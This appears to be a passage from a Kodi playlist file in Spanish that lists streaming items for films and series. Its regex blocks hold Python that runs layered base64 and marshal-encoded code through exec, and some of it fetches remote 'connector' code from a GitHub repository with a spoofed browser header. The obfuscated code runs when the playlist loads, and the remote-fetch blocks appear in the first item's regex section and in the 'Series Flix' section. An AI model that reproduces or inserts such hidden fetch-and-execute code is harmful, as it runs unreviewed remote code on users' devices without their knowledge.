dwd01qRmtUVzF4YTNGVVJVSkVNazE1UVhZNVQzSklNWGRLU2tGTFRESk5lWEF4WTAxSE1uazBSVkE1ZDAxUldqVnhTMDFNYnpKRllYQmhVMk5hVVVsaFduZE1NVWQ1UVc1QlZYQnRTWGh4WjNCdFNXNUVkMGxZYmxWT05VMWhWMWR2UjBRd1RUQk1ha1F3YTB4R01uVkVibmxQYW01NVkybEtTREZoU1hobldHNVVTRFZDVWxac1JqSm1aVTEyT1hkdWJWTnFURXRXYlUxM2VVeEtSMU5XUVVocmEwVmhlWGRIUjAwMFIxRkpkMjVVVFdoTWVqbDNSa2hKTmtRelYxTktkMXB0Ym5ZNVYwbDNRVnBDVkhCdFNGTlBabGd3U1RCQmJYbE5TbUZqTVZvd2VXNXdVRGw0UVVnMGFVcElURFZGVlhsalNIbHdhWEJMU0RCSlNFVmxibTFKU0VKTFRVUk5iVWd6UmpOMVUyNUlaekJhZGpscmNETlBVRUZVT1dwS1NqQnRjRWRKYTNBd2RHVndSM0Y0YjIxME0yNUxRVTlFU0dONldqQjFaMGxIZFZad00yTlNXVEJNYlVSS2NERk1SMEZpU25wak0zSjRjWGx3ZWxadGNIcEpaM0o2YTNoSk1ubHNRbEpuVjNKVU9XSllNSGcxVFZWQmVWb3dlWGh1WVZONldtMTVhMFo0VjNkSFNqbDZUVlJJTkVsS2VWQkpVblJ0UmtwbmQzQjNUVEJ1VVVsU1JqQnhObkI0ZERWQmVVNXBibFJUV0c0eWRUSnZkMEZJVEV0alVGcFNkVmhHTUVGcGNWSXhVMHhoZFhwQ1IxZGhjWHBYYkVoSFFXMUZTRmRpUVZKYU5YRjZhMHhGVURsWWJsRkZaMHAzVDNwdmVqbE5iekIxVDBGaFQyUnZNbW8wUlZGMWEwY3hZekphU1ZwcVRXdzViRmt6VDIxYWVFRlpjVzFQWjNCNk9VVklTblZKVEVkME5FWlZRVFZ2TUUxcGIwZEpZMjVJY1VaR2QwMVpjVlZXTlc5VFVtMU1NVWsyV1RBNGEwcDZSVmh4ZVU5WWIyMVBaMFZUVERKeGVuRjJSSGxKTlVreVVqQk5TRUV5V2pKVGVVSlJkREJ1YlZOTmNFZE5Oa2w0WTJ4Q1Iza3lRVEpCWTI1VFkzWnVValZXY0VoWFNtOHpZelZNTUdac1RIZDViRTB3VjJOR2JYZzBRbEl4ZGt4NE5VMVliWFZYUVV0UFUwcDZlVEZ4UzFOVlJubFdhbGx0ZUdWRWVWb3lXR3c1TW5GVVoxaHZNSFUyUVhwNWJuRkpjR1ZCVVhWc1IwaG5UVXd5VW10QlVVVjFUVXBYUmtkUlUxQmFiWFY1U1RKTmEwMTJaMkZLU1hWYVJIbHdNbkF3U0d0QlNHZFVSakJuVkc4eFUzaEdWR2RaU1RBeGVFbFJkVFpJUjBsWFFURkZRVm95VTJWWk1HdGtjRXRUTm5BeWRXbEhTbmcxV0RCSlIwVlRUR1ZOUzJOWlFVdDFiVWxKWXpaRVNrRm1SbEZQVWtRd1JVdHdiVk5oY0hkd00wcExVM2hOVW5ReGIwZE5iVWRRWjFwTk1Hc3libE5UTW05VWFtVklNSGcwY0VkRlQwcEtkWHB2ZUVFeWNWRkJZbGd6VWpGYU1YbFZTRlZXYW00eWVXUkdlSFZpV21GMWFuQlVjVkJLVTBWYVRWRldORTB3WTBwdVNGSmxTa2x3TWxwU1RVRllNMU5SVFVwSlZFMHhkWHBHU0UxTFFXMUpiVXd3UVd4eVMwRlpjRlIxYWtSNmNXeEtTR05QY1hoWFRIQlJUelp5ZDAxcVFrcFhZbkpWY1dORlZVRlZRWGhtYWt3d1p6SkdTM1Z0YjNweFJrRkhlWFZOUjFORlNWVlRla0Z0ZVZaQmVqRmpUWGd4VTBFeVRWTkVTVTh5VEVoQmJVMVVhMnRhZWxadFFYaEVhMjVVTlhaTVlYbDVjREJUYTI1VFRYVk1NM2xFYjFSVE0wZEpjWHBDVlhGb1FVcFRXbTU1ZVhoSlNtczJjbUZCTlhKR1pqTkVTMEUwUnpGRU1YQjNjR1ZFZUVWaGNrZFhNMjU2Y0dWTk1GWXhia3Q0TWsxM2VHdEZVblZWY0RCalpFSkhlV2x4TVZkQ1FWUjRha0Z0VmpWTlVVbDNSM3BCU2xwM1UyeHVNR05MY1ZWMVdVcFFPVVZCTVdNMGNYbzFUM0pHT1dGS1UwRmlXVEY0TVhKS1JYVmFZVmRWUm1GVGVHOTZPVkZIYlhGc1FsQm5aVUV5VTFoQk0xWXpUREZhTTBSaFV6SkJTbmd6UjJGQlYxa3dkREZJZDA5SGIyRmlaVWxLVTJkS1NsbzFia3BCWm5KTGVHdHlTMWRpVEVwMVNGcHRUWGR4VTJOU1RYaFhWMFl5WTFCeGJEbEhiMGd4TmxneWVXRkJlR05hYmxWNVdrd3hZMmRFZWpFMVJ6QkpSM0JMWTJaeWVuRnNjblk1ZUVaNE9ETklTazFGVFVocmVYRkhUbXBKYlZJeFNubFhaa0V4WTIxTU1ubGtURXBtTkVKVVkwMXhNamxUU1VwVFJVSkdPVXB4UjBWWVdqSnhVa0pJZVZGdmQwNXBSMGRhYTBaM2NVRkJNVm93Y25sNU0xa3lVMDlGTW1kQmJ6QnhNVzVWVTBkSlNEUTFSSGw0TlZwSlFVaE5SbWRJV2pORmJrZ3plV2x2U1dNd2JtRjVlbHBKVEcxd01sWXliM2ROUzI4d1FYVkpNblJyY0cxYWFVMWhZMFJCZDFJMFNsRk5Ta2xMVFhsRlIwUXlSa3A1UjFwSlRHdEdlREF4Um1GWFoweDNjVmRGU0VGRmJqRmlha3BLVTFOd01IbGxjR0Z4VVhKTFUxSkJTREJ0V1RBNVVHNXRkV1JFTTNGYVduZEZXbTlLT1dSdU1uVnBSMVJ4UWxwNk5HeE5SMFZWY2tweFlVa3lTV2R1U1hsYVdXMU5RbTh4UkcxSWVYVmpRbFIxU1hCU1dtMXdWREEwYnpGNU5IQXpkVlpDU2sxUlIwdDVhMW94VERGSFVVRlNRVWhKYkhGS01XVnlZVk5ZV1RBNE1FMVRkV1p1TTFkbVRWUjFZMEZVYXpWWk1YQXdRbEZUVlhCaFUxQnZlSEF6YjBoblNYQjZhMFZOZDFjeFJIaEZlVWxLWTBwR1VVNHpTR0ZQYVhCNk9XWkJNR0l3UmpKcWFVa3hTVU5JTW5WcVIwZFBZVUV5UVZkdlNFRlhSVEpFTWtadGNEVkhkMEY1VFhkYU5VRjRabTF3ZUVsa1dUQkZVVzR6VTFodVNuVXpjRWR4YkVsUmNVWktlRGhwUmxSQlZVUXhSWGhOU1ZJeFJqSmpiRVI2YTJGWk1sZHBRa3BhYW5CSmRXdHViWEJyV2xKTk1FcFFPVXhDVkVGM1JIWm5XbkJVUlU5R2QzbFVXbnBXYlZrd2NXcElTRGhzYmpKamFVRklUVVJLU0djd1RVZ3dOSEJVTldkTk1rMU1UVk41Ykc1SVUxcEVZWGxaUWtkSk1HOTZNVlpCVlVnMGNGQTVVWEpKY1UxRVIwRldia2h3WlVaSlYwTnlZVkkwY1VwblkweExTVU5CVkRsUFFUTlBlRTF0VWpGQk1IbFFSSGhxTkVoM1JYbHdNVXd3UlRKME0zQXdTVmhZTWpGb1NVcDVaWEo1VDJKQmVHTkhURWROZFVneldtbElNVUUwYnpCNGFreHRjV1ZKVkVGQlJXdzVUMGw1VjJOSVlVODFSa2htYkVVelkxWk1TSGxYUm13NU1XNUxUV2RIZUdkMWNrZEZNMHd6Y1RCTWVXTklXVEZGWTNCNFZtbHZTMkpzYjFKVFdsZ3djVFJGYlhGcmNWRjVlVTFTVXpOSmRtZHJSbmhOVFVadGNHVk5SMEZVUjNkQlRVSkpZMjVHWVU5VlRFbHhlSEZMY1ZsTmVEa3pjbEYxVVUxaFJHMUJNMFZRV1RKNE1rRlNXbTFDVlU5NmNGUTVUSEI2ZFdWTU0xWmxRVEphTlc4d1p6UkpVa1ZOUmpCcmFrWXlTV0p3TWpGbGNEQlRiVTFKWW0xeVVYbFVTRWROYlVKVGVUWllNa2t4UVROT2JWbHRTVE51UzA5TFdraEJha1p0VTJ0RlIwbG5ia3RCWWtVeGNXTmFkbWRvYmtkVFkxaHRRVFZ3ZUdkc1RFZFRZa3AzY1doYVNHZElXVEJqUzFwM1FUSnZNSEZFVEhsVE1Vd3llVFZOU21Zd2JucHJUWEF4VFRWR2RqbDRTRWhKWjI1SU5EUkpVVmMwYjFWQmQwRnRTVkZCZDNGdFJUSlNNMGw0TVVGRlNIRlVSekpKTVhFeU1EVkJWRWxOVEV0YWEzRXdSVzVhTVhnMFRUTlhRMXBzWjIxSVIwMXNUREl4VkVSSFFXMUNTRFF3UVd4bmJVbFZXbWx4VkdvMFRVbGpTVnBoUVhaQlIxTnRXa3QwWlVKSVNETnVTRmR0UkVoVFFXOTVlV0pJZGpocmNrcE1hVzk0WTNad2JEbG1UREZKYlhCdFRYWk1iVUZJUWtkSmRVbFJUV0phTUd0dFdHeG5Za0Y2T0RCdmJVVkJjR3c1YWxreFFXWnhiWGxEUVRKRlNuRXdTR2xhVkVWVFdrcEpXVVp0Y0ROYU1YZzFRa1k1VjNBeWRXRnZSM2xpUkVocWFuRXlPWFpFU0V4cVdrbFNhVUZJVjBsS1VYbHJURWQxYlZnemNVbEhiVk16UkcxNWVYSlVWak5hU2psQlRFbFhUVzlVVWpKd2JVa3lXRzFCV2tReWRYaElla1YxYmtkVFdrUjZUREp1VkhrelNuZFRaRXBSU1VkSlNsTlBSbEpKYTBReFVqRnZSbVpwV2xBNE1scDVUbXBIZDNSc2NHeG5lRzlLTUdsdmVYQXpXbmg1VjNKSVUyMUJWV04yV1cxeFVWb3lPVlpCVkVWaVJtRnhSVUYzZURCQlNubG5Xa3BJWlhGVVV6Rk5TMW96Y1RJNGJVaDNXak5OUmpsNmJrZHhXRVF5T0cxeFZVNXBTbEZCWjNFeU9XVkhSbWRSYm0xeFdXOUpTR3BaTUVGMVFsVkJka3hKZVVsTVIweHBUVWgxUmtWMk9HbEtTbU5SY0ZBNE5FaExRVWR3UmpnelIwdGFaVTE2VERCWk0wNXBXV3c1YUhCc09HdHhTblV6UWxSMWJVa3lkVzV2VW1kaVRUTjRNVnBzWmpWQ1IzUTFUVXBKUlVKSlJVUnhNRVJyU25ZNVpuQktabXBDUjNsRlFVZDVXRzlLY1cxeFVHWnBTVXBJWlhCVWREQnVNa0Y1UWtkTU1tNVFPWGhKU21ObWJrZFNNa1ZIZEdseGJEbE5Ra2hFTlV4S09ESkhWRk4xV2xOeFpVUXlhM1Z3ZDNsQlNYZEJiVmd3VTJaeVIzaHBXbEpKVlhKVlUyUkZNSEF5V1RONVVVRlFPRFZ5ZG1kWFdESlRkMEpVVW0xS2RqZzFTVXBxTVVKR1ptcE1TMXBsVEhwMVNYSkhlV2RaYkRobFJYWm1hVmxzWm1WWmJYUnRjRXBCTlZsc09XZFliVkkxV0RCYWJYQXlVMGxFTTFwbFNWUXhhVWxVZVRCSWR6QmhVVVJqTm01S09XaFdVVEIwVnpGck5FRnRWM0J5VVUxNlMxVjBNMEZUYXpSYWJWTndjbEZhYlZkcU1GaHZla2xwVmxFd2RFMUxUWFZ2VUhSaFMxVjBNbHA1YXpSQmQzbHdjbEZOZVV0VmRESmFTV3MwUVcxQmNISlJURzFMVlhReVFrbHJORUYzZVhCeVVWZDVTMVYwTTBGSmF6UkJla2x3Y2xGTU5FdFZkREpCU1dzMFFXMTFjSEpSVFhkTFZYUXlRa2xyTkVGM1RYQnlVWEExUzFWMGJFSlRhelJCZWtWd2NsRk5la3RWZEROYWVXczBRVzFQY0hKUlREUkxWWFF5UVVsck5FRnRTWEJ5VVhCdFMxVjBiRUpKYXpSYWQwNWhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNRWEJ5VVUxNlMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRETmFNV3MwV25wSmNISlJUREJMVlhReVFVbHJORUYzUVhCeVVVMTZTMVYwTWtGVGF6UkJkMGx3Y2xGV05FdFZkRE5CVTJzMFFXMVhjSEpSVERWTFZYUXlUVWxyTkVGM2VYQnlVWEF3UzFWME0wSkphelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUms1bFZsUkpNa3hLYW1KWE1XczBRWGRYY0hKUlREVkxWWFF5VFVsck5FRjNVM0J5VVhCdFMxVjBNbG94YXpSQmQzbHdjbEZNTlV0VmRHeE5TV3MwUVcxSmNISlJUWGxMVlhReVFsTnJORUYzU1hCeVVYQTBTMVYwTWt3eGF6UkJkM2x3Y2xGTU1rdFZkRE5DU1dzMFduZDFjSEpSVFhwTFZYUXpXbmxyTkVGM1UzQnlVVXh0UzFWME1rd3hhelJCZDBsd2NsRldOVmRzZUhSWWJFOTVjWHBUWmxoUWNYQnlVVXh0UzFWME1rMTVhelJCZDBWd2NsRk1NVXRWZERKYU1XczBRVzFCY0hKUlYzbExWWFF5UVZOck5FRjNTWEJ5VVV4dFMxVjBNazE1YXpSQmQwVndjbEZNTVV0VmRHeENVMnMwUVhwWGNISlJUREZMVlhRelFrbHJORUY2UlhCeVVVeHJTMVYwTWt4NWF6UkJkMGx3Y2xGd2JFdFZkR3hhVTJzMFducEJjSEpSVm1wTFZYUXpURWxyTkVGM2VYQnlVVTE2UzFWME1rMUphelJhZDNoaFdFUXdXRTFMVFhWdlVIVjNiekl4YW01S2EzbFlWV05tYmtwV2FFMVVTWGR2TWpGcWNIcEpiWEJzZFhaTVMwRjVRWGRFYUV4M1REQk5WRWwzYnpKRmVWaFVTVEpNU21waVZ6RnJORUY2U1hCeVVVd3hTMVYwTWsxMmNHTllSbmhtVjIxcmJYRlZWMk52ZW5BclYyeHFZVTFMZFhsTWJIQmpXRVE5UFhRRkFBQUFjbTkwTVROekNRQUFBRzF2Y25Cb1pYVnpJSE1jQUFBQVkyOWtaV056TG1SbFkyOWtaU2gwY21sdWFYUjVMQ0I2YVc5dUtYUUdBQUFBYjNKaFkyeGxjeDRBQUFCamIyUmxZM011WkdWamIyUmxLR3RsZVcxaGEyVnlJQ3dnZW1sdmJpbDBBd0FBQUc1bGIzTUlBQUFBUEhOMGNtbHVaejUwQkFBQUFHVjRaV01vQ3dBQUFIUUdBQUFBWW1GelpUWTBkQVlBQUFCamIyUmxZM04wQ0FBQUFHMXZjbkJvWlhWemRBY0FBQUIwY21sdWFYUjVVZ1FBQUFCMENBQUFBR3RsZVcxaGEyVnlkQVFBQUFCNmFXOXVkQVFBQUFCbGRtRnNVZ1VBQUFCMEJ3QUFBR052YlhCcGJHVjBDUUFBQUdJMk5HUmxZMjlrWlNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6RGdBQUFCZ0JCZ0VHQVFZQkJnRUdBU29CIikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>



------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <item>
<title>[COLOR gold]* [COLOR lightseagreen]Miniseries Cristal [COLOR white]Cristal [COLOR gold][/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/H9Lcmk9.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
<externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/SERIES/Base.Miniseries.txt$$LSProEncKey= $$</externallink>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]Flix[/COLOR] </title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series Flix [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/qvzF7Rz.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
<link>$doregex[makelist2]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHZ3b0FBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT1IxVXpUa1JqTVUxNlVUTlpWRmsxVFhwSk1rNXFWWHBOYlVreVRucEtiVTU2UlRCT2VsRjRUbXBWTWsxVVdUUk9lbFV5VGtSUk0wNUhXVEpPZWxrMVRYcFZNVTVVWTNkT1JFVjZUMVJTYTA1RVp6SmFhbEY2VGtkVk1WbFVXbTFPYW1zeldWUlNhVTE2UVRKTmVrMTVUWHBKTWs5RVVUUk5lbFV6VDBSV2FFNUhVVEpPVkUxNVRrZEZNRnBFWTNoT2Vtc3dXV3BOTUUxNlVUTk9WRlUwVGpKRmVrOVVZM2xPZW10NlRtcGFiRTE2UVRCTmFsVTFUa2RaTUU1RVRUUk5lazB3VFZSWk1VNUVVVEJQVkZVMVRtcHJNMDVVV1hsT2JWVjZUV3BhYWs1VVl6Tk9hbHBzVGtSbmVrMVVTbTFOZWtreVRrUlZORTE2WXpKT1ZFMHpUbFJuTWs1RVdUSk9iVlV6VG1wak1rNVVRVEphVkVwdFRYcGpNMDlFVm1oT1ZFbDZUbnBaZVU1dFZUTlpWRTAxVFhwcmVWcHFXbXhPVkUweFRYcGthRTVxV1RKYVZFMHlUVzFKTTA1VVZUSk5lbFY1V1dwTmVrMTZUWGxhYWxKclRsUkJNbHBVVFhoT1JFMTVXV3BOZWs1RWF6Tk9hazE2VFcxWmVWbHFVbWhPUjFGNVdtcFZORTE2VlROTmFsazFUVzFaTWs1cVdUSk5iVmt6VDFSTmVVMTZWVEpPVkdNeVRucFpNRmxVVFRWT1ZGa3pXVlJOTlU1SFJYbGFhbU0xVFcxSk0wOUVWVEpPZW1zeFRucE5lazVVWnpCYVJGRTFUa2RWTTFsVVl6Tk9ha1Y2VFVSamVrNUVUVEZPYW1Nd1RtMU5NVTlVVlhoT1YwVXdXbFJOTkUxNll6TlBWRlpvVG5wWk1rNVVWVEpOZWtVeVRYcFJNVTV0UlRKWmVsa3lUa2RSTWxsVVdUVk9WRmt4VFVSUk1VNXFWVEZaVkdNelRXMVpNVTFFV1RCT2JWVXhUMFJSZWs1VVl6Qk9SR00wVG5wSk1VOVVWbWhPVkdjelRWUk5NRTV0UlROT2FsSnRUa2RWTWsxNlRUVk9WR3N4VGtSTk0wNVVZek5OVkdNelRsZEZNbHBVVlRST1YwVjZUMVJOZUU1NlVUTk9SRXB0VGxkRk1GbHFaR2hPVkdjelRYcE5lVTE2VlRGUFZFcHBUWHBWZWs1VVkzcE9hbGt5VDBSTmQwNVVTWHBQVkZKcFRYcE5NVTVFV1hwT1ZGRXpXVlJXYUU1cVVUSlBWRkV4VGtSUk1FNTZTbWxPZW1zeFQwUlZlVTVVYXpKYVJHTjRUbTFWTTA1VVl6Uk5la0V3V1hwa2FFNXFhM3BQUkZWNFRsUkZNbGxxWTNoT2VsRjVXV3BOTTA1RVZUTk5SRXB0VGtkWk1FMTZXVFZPYW1zelQxUlJNazU2V1RKT2FsVjNUa2RaTWs5RVkzZE9SR2N3V1ZSTk1VMTZaekpOVkZWNlRtMU5NRmw2V214T1JFa3dXbXBSTUU1cVp6Sk9WRXB0VGxSck1GcFVTbWxPVkUxNlRtcFZkMDU2YXpGTmVsSnBUbnBqTUU1NlRYbE9WRVV6VFVSVmQwNXRXWHBOYWxFMFRqSkZNRTFVVFhwT2Fsa3dXbFJWZDA1VVRUQlBWRlV6VFcxWk1rOVVXbXROYlZreVdsUlpNMDVFV1hwUFJGRTBUa1JWTUZsNlNtMU9hbXN6VG5wYWFFNUVWVEZOUkdOM1RrUlplazVVV1hsT2Ftc3dUbXBOZDA1SFRUTlBSRTB6VGxSWk1VMXFVbWhOZWxGNlRucFZlazV0VlRCYWFsa3hUbFJSTWxsVVdUSk9SMGw2VGxSUmVFNUVaM3BOYWxFd1RrZEplVmxxWXpST1ZFa3pXVlJqTWsxNlFUSlBWRkY1VGtScmVWbHFUWHBOZW1jeVRucFZNVTVFV1RCYWFsa3dUbnBaTUZsNlZUUk9iVTB6VFVSVk5VNUhXVE5OVkUweVRrZFJNazVxVVRSTmVrMHhUVlJWZVUxNlVUTlBWRmw1VG1wTk0wNUVWVFZPTWtVeFRrUlJlazVVWnpCTmVscHRUbXBGTVZsVVl6Tk9iVmw1V1dwU2FVMTZXVEJaVkZKdFRrUlpNVTVxVFRWT01rVXdUMFJOZVUxNldUQmFWRTAwVGxkRmVrNVVVbXROZWxFd1RXcE5ORTE2VFRKYVJGa3dUa1JaTTAxVVl6Rk9SRTB5VFdwWk1FNTZTWGxhYWxwc1RtMVpNVTFFWXpCT1JGa3lUV3BhYVU1RVJUTk9WRTAxVG5wRk1rMVVWVFZPYlVsNlRWUmthRTV0V1RGT2VsVjZUbFJSTVU5VVdtcE5lbU14VFhwUk1VNVVWVE5PZW1NelRtMUpNRTVFWkdoT2FsVXhUMVJqTTA1RVRUSk5lbEV3VFhwUk1GcEVUVEZPVkZsNVdXcGFiVTE2WTNwUFZGRTBUbXBOZWs1RVZYZE5la0V3V1hwamVrNVVaekZOVkUweVRtMU5NazlVVVRST2FsVXlUa1JTYWs1SFRURlBWR013VGtkRk1VOUVZM2hPUkUwd1dXcFJOVTV0UlRGUFJFMDBUbTFSTUZsVVVUSk5lbWN5VDBSWk1VNTZZekJPZWxVMFRrUlJlazE2V210T2VtTjZUbnBqTUU1SFZURlBWRmt3VFcxSk1sbHFXVFJPVkZreFRrUmFiVTVFYTNwTmVtTjVUbTFaTUUxVVRURk9lbWN4V1ZSUmVVNVVXVE5QVkUwd1RrUlplVnBxVlRWT2Fsa3hUWHBSTkU1cVVUQk5hbU13VG0xWk1GbFVUVFJPUkZsNlRWUk5NMDVxWnpGT2VscHFUbnBKTTAxNldtaE9la2t3VFhwTmVrNTZVVEphYW1NMVRrUlplazVFV1RCT2VrMHdUV3BOZVU1VVJUSlBWRlUxVGxSck1rNXFZM3BPYW1zd1dYcFNhazVFVlRKT2FrMDFUbnBqTVU5RVVYaE9iVkV4VFZSU2EwNXFXWHBOYWxab1RYcFZNbGxVVVRSTmJVa3pUMFJhYWs1RVRYcFBSRmt6VGtkTk1GcFVVbXRPYlVVd1QwUmpNazVxU1RGTmVsVjNUWHBaZWs5RVkzcE5lbEV6VG5wTmVFNXFZekZOZW1NeVRucE5lazVxVlhkT2FtTXhUV3BTYTA1VWF6TlBWRkV6VFhwck0wMUVVbXBPUkZFelRWUktiVTVFUlRCUFJFMHlUbFJSTWsxcVVYcE9WRlY2VFVSS2FVNUhTVE5PVkZFd1RucFpNMDFFVVhsT1JGRXlUbFJSTlU1RVVUQk9hbEV3VGtSSk1FMVVWWGROYlVrd1dsUmpNRTVIVVRKT1JGSnFUbnBCTTA1cVVUTk9WRTB5VFhwTk1FNVVXWHBOVkZFMVRtcE5NRTlFVVRSTmVra3hUa1JWZUU1NmF6Sk9hbEV4VGtSSk1rNVVZek5PZWtFeFRrUlZkMDVxWXpKT1JGbDZUWHByTWs5RVRYcE9lbU13VDBSYWJFNXRUWHBPZWxrMFRXMUpNMDVVWTNkT1JFVXhUMFJqZDA1dFZUSk5lbEpyVFcxWmVWbHFVWGxOZWxFd1QwUk5lVTVFUlRKT1JFMDFUa2RGTVU1NlZYcE9ha1V3VFZSWk1rNVVSVEJOVkZrMFRtcHJNRTlVV1RST2Vsa3hUV3BWTkU1cVRUTk5hazB4VGtkSk1rNUVXVE5PUjBWNVdtcGplazU2UVhwTmFsVjZUa1JWZWsxRVRUQk9WR3Q1V1dwV2FFNXFZM3BPYWswMVRYcFJNRmw2WTNwT2FtY3hUV3BXYUU1Nll6TlBSRXBwVGtkRmVrMTZXVFZPYlVsNlRXcFNiRTVIVVROTmVsRjVUVzFaZWsxNlVUQk9lbU15V2xSTmQwNVVUVEZOYWxVd1RsUnJNRTFxVFROT1ZHc3dXVlJqTlU1SFVYcE9hbEUxVG0xUmVrNVVaR2hPUjFreFRsUlpNazU2WnpCTlZGVTBUWHByTUU5RVRUSk9hbEV5V21wUk5VNTZaekpaYWswd1RtcGpNMDFxVl